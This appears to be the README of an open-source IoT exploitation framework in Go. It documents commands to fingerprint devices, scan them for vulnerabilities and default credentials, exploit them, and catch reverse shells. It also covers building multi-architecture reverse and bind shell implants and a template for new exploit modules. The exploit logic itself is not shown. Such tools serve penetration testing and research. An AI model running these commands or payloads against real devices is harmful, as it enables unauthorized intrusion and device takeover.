# GoAccess IoT Exploitation Framework

GoAccess is an active IoT exploitation framework written entirely in Pure Go with zero
runtime dependencies. It provides a CLI with three operational modes `identify`, `scan`,
and `access`. It is designed as a reusable and pluggable Go library.

## Features

- Around 180 exploit modules covering 57 vendors
- Around 180 credential modules with vendor-specific default wordlists and brute-force capabilities
- Password generators for MAC/serial-derived credentials
- Pure Go protocol clients for HTTP/HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
- Zero CGo dependencies, making it a portable binary and library
- Multi-architecture reverse shell payloads for `ARM`, `ARM64`, `MIPS`, `MIPSLE`, `MIPS64`, `x86`, `x86_64`
- Channel-based worker pools for concurrent scanning
- JSON output for all commands with `--json` and `--output` flags

## Installation

Requires Go 1.22 or later. Binary is built to `./bin/goaccess`:

```bash
git clone https://github.com/cookiengineer/goaccess.git;
cd goaccess;

make build;
```

## Quick Start

```bash
# Identify a target device
./bin/goaccess identify 192.168.1.1;

# Scan for vulnerabilities
./bin/goaccess scan 192.168.1.1 --threads 32;

# Actively exploit and gain access
./bin/goaccess access 192.168.1.1 --listen :4444;

# List registered modules
./bin/goaccess list exploits --vendor dlink;
./bin/goaccess list credentials --vendor tplink;
./bin/goaccess list payloads;
./bin/goaccess list keys;
./bin/goaccess list vendors;
```

## Commands

### Identify Target

Fingerprint target hardware via port scanning, MAC OUI lookup, HTTP banner grab, UPnP SSDP
probe, and SNMP description.

```bash
goaccess identify 192.168.1.1;
goaccess identify 192.168.1.1 --json --output result.json;
goaccess identify 192.168.1.1 --oui-only;
goaccess identify 192.168.1.1 --verbose;
```

| Flag         | Default | Description                 |
|--------------|---------|-----------------------------|
| `--json`     | false   | Output as JSON              |
| `--output`   | (unset) | Write JSON output to file   |
| `--oui-only` | false   | Only show OUI vendor lookup |
| `--verbose`  | false   | Verbose output              |
| `--threads`  | 8       | Number of parallel threads  |
| `--timeout`  | 8       | Timeout in seconds          |

### Scan Target

Scan for vulnerabilities and default credentials.

```bash
goaccess scan 192.168.1.1;
goaccess scan 192.168.1.1 --vendor dlink --type router;
goaccess scan 192.168.1.1 --threads 32 --timeout 10;
goaccess scan 192.168.1.1 --skip-creds;
goaccess scan 192.168.1.1 --username admin --password password --vendor wordpress;
goaccess scan 192.168.1.1 --json --output results.json;
```

| Flag              | Default | Description                                |
|-------------------|---------|--------------------------------------------|
| `--vendor`        | (unset) | Filter exploits by vendor                  |
| `--type`          | (unset) | Filter by device type                      |
| `--threads`       | 8       | Number of parallel threads                 |
| `--timeout`       | 8       | Timeout in seconds                         |
| `--skip-creds`    | false   | Skip credential checks                     |
| `--skip-exploits` | false   | Skip exploit checks                        |
| `--username`      | admin   | Username for authenticated takeover        |
| `--password`      | (unset) | Password for authenticated takeover        |
| `--password-list` | (unset) | File of passwords to try with `--username` |
| `--json`          | false   | Output as JSON (streams results)           |
| `--output`        | (unset) | Write JSON array to file                   |
| `--verbose`       | false   | Verbose output                             |

### Access Target

Actively exploit a target to gain access.

```bash
goaccess access 192.168.1.1;
goaccess access 192.168.1.1 --payload arm --listen :4444;
goaccess access 192.168.1.1 --shell;

goaccess access 192.168.1.1 --no-creds;     # exploit only
goaccess access 192.168.1.1 --no-exploit;   # credentials only

goaccess access 192.168.1.1 --username admin --password password --vendor wordpress;
goaccess access 192.168.1.1 --username admin --password-list rockyou.txt;
```

| Flag              | Default | Description                                |
|-------------------|---------|--------------------------------------------|
| `--threads`       | 8       | Number of parallel threads                 |
| `--timeout`       | 8       | Timeout in seconds                         |
| `--payload`       | (unset) | Preferred payload architecture             |
| `--listen`        | 0       | Listen port for reverse shells             |
| `--shell`         | false   | Drop to interactive shell                  |
| `--no-exploit`    | false   | Skip exploitation, creds only              |
| `--no-creds`      | false   | Skip credential checks                     |
| `--vendor`        | (unset) | Filter exploits by vendor                  |
| `--type`          | (unset) | Filter exploits by device type             |
| `--username`      | admin   | Username for authenticated takeover        |
| `--password`      | (unset) | Password for authenticated takeover        |
| `--password-list` | (unset) | File of passwords to try with `--username` |
| `--json`          | false   | Output as JSON                             |
| `--output`        | (unset) | Write JSON output to file                  |
| `--verbose`       | false   | Verbose output                             |

### List Modules

List registered modules.

```bash
goaccess list exploits;                # all exploit modules
goaccess list exploits --vendor dlink; # filter exploits by vendor
goaccess list credentials;             # all credential modules
goaccess list payloads;                # available payload architectures
goaccess list keys;                    # SSH hardcoded keys
goaccess list vendors;                 # all vendor names
```

## Building Reverse Shell Payloads

Cross-compile reverse shell implants for all architectures:

```bash
make payloads;
```

This produces 14 static binaries under `payload/`:

| Arch     | Reverse TCP                  | Bind TCP                  |
|----------|------------------------------|---------------------------|
| `arm`    | `payload/arm/reverse_tcp`    | `payload/arm/bind_tcp`    |
| `arm64`  | `payload/arm64/reverse_tcp`  | `payload/arm64/bind_tcp`  |
| `mips`   | `payload/mips/reverse_tcp`   | `payload/mips/bind_tcp`   |
| `mipsle` | `payload/mipsle/reverse_tcp` | `payload/mipsle/bind_tcp` |
| `mips64` | `payload/mips64/reverse_tcp` | `payload/mips64/bind_tcp` |
| `x86`    | `payload/x86/reverse_tcp`    | `payload/x86/bind_tcp`    |
| `x86_64` | `payload/x86_64/reverse_tcp` | `payload/x86_64/bind_tcp` |

## Library Usage

GoAccess is designed as a library. Import and use it from your own Go programs:

```go
import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/scanner"
    "github.com/cookiengineer/goaccess/types"
)

func main() {

    config := &types.ScanConfig{
        Target:  "192.168.1.1",
        Threads: 16,
        Timeout: 10 * time.Second,
    }
    engine := scanner.NewScanner(config)

    // Identify
    result, _ := engine.Identify("192.168.1.1", config)

    // Scan
    ch, _ := engine.Scan("192.168.1.1", config)
    for r := range ch {
        if r.Vulnerability.Confirmed {
            fmt.Println("VULN:", r.Exploit.Name)
        }
    }

    // Access
    accessResult, _ := engine.Access("192.168.1.1", config)

}
```

Each protocol package exports a reusable client struct:

```go
import (
    protocolhttp "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/protocols/ssh"
    "github.com/cookiengineer/goaccess/protocols/telnet"
)

// HTTP
httpClient := protocolhttp.NewClient()
httpClient.Target = "192.168.1.1"
httpClient.SetBasicAuth("admin", "password")
resp, _ := httpClient.Get("/", nil)

// SSH
sshClient := ssh.NewClient()
sshClient.Target = "192.168.1.1"
sshClient.Login("root", "password")

// Telnet
telnetClient := telnet.NewClient()
telnetClient.Target = "192.168.1.1"
telnetClient.Login("admin", "admin")
```

## Writing Exploits

See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for a step-by-step guide on writing new exploit modules.

```go
package my_exploit

import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/types"
)

type Exploit struct { httpClient *http.Client }

func init() { exploit.Register(&Exploit{httpClient: http.NewClient()}) }

func (e *Exploit) Info() *types.Info {
    return &types.Info{Name: "My Exploit", Vendor: "myvendor", DeviceType: types.DeviceRouter}
}
func (e *Exploit) Options() *types.Options { return &types.Options{Port: 80} }
func (e *Exploit) Protocol() types.Protocol { return types.ProtocolHTTP }
func (e *Exploit) Fingerprints() []*types.Fingerprint { return nil }
func (e *Exploit) Check(target string, opts *types.Options) (*types.VulnResult, error) { /* ... */ }
func (e *Exploit) Run(target string, opts *types.Options) (*types.ExploitResult, error) { /* ... */ }

var _ interfaces.Exploit = (*Exploit)(nil)
```

Then add a blank import to `exploits/imports.go`:

```go
import _ "github.com/cookiengineer/goaccess/exploits/routers/myvendor/my_exploit"
```

## Architecture

```
goaccess/
├── interfaces/        # All interfaces: Exploit, Scanner, PasswordGenerator
├── types/             # All data types: Info, Options, ScanConfig, ScanResult
├── exploit/           # Global registry (Register, ByVendor, ByModel, Get)
├── scanner/           # Scan engine (Identify, Scan, Access with worker pool)
├── protocols/         # Pure Go clients: http, tcp, udp, ssh, telnet, ftp, snmp
├── exploits/          # Exploit modules and Credential modules
│   ├── generic/       # Heartbleed, Shellshock, RomPager, TCP-32764, GPON
│   ├── routers/       # D-Link, Cisco, Netgear, TP-Link, MikroTik, ...
│   ├── cameras/       # Brickcom, Grandstream, Honeywell, Siemens, ...
│   ├── drones/        # DJI, Parrot, Tello, DB Power
│   ├── servers/       # WordPress, Joomla, Drupal, Tomcat, Jenkins, SAP, Magento, ...
│   └── misc/          # ASUS projector, Miele, WatchGuard, WePresent
├── shell/             # Reverse/bind shell handler + listener
├── payload/           # Pre-built multi-arch reverse shell binaries
├── wordlist/          # Embedded credential dictionaries (go:embed)
├── oui/               # MAC OUI vendor database (23,798 entries)
├── ssh_keys/          # Known hardcoded SSH private keys (9 vendors)
├── parsers/           # Config file parsers for credential extraction
├── libs/              # lzs (ROM-0), sqlinject (SQLi engine), webapp (web app helpers)
├── report/            # Colorized CLI output + JSON formatting
└── cmds/
    ├── goaccess/      # Main CLI binary
    └── rshell/        # Reverse shell implant
```

## Testing

```bash
# Run all tests
CGO_ENABLED=0 go test ./...

# Run tests with podman integration tests
CGO_ENABLED=0 go test -v -run Integration ./scanner/

# Lint
go vet ./...

# Build + test + vet
make build && make test && make lint
```

## Docker

Multi-arch Docker build for cross-compilation:

```bash
docker build --platform linux/arm64 -t goaccess:arm64 .;
docker build --platform linux/mipsle -t goaccess:mipsle .;
```

## License

This project is licensed under the [GNU Affero GPL 3.0 license](./LICENSE_AGPL3.txt).

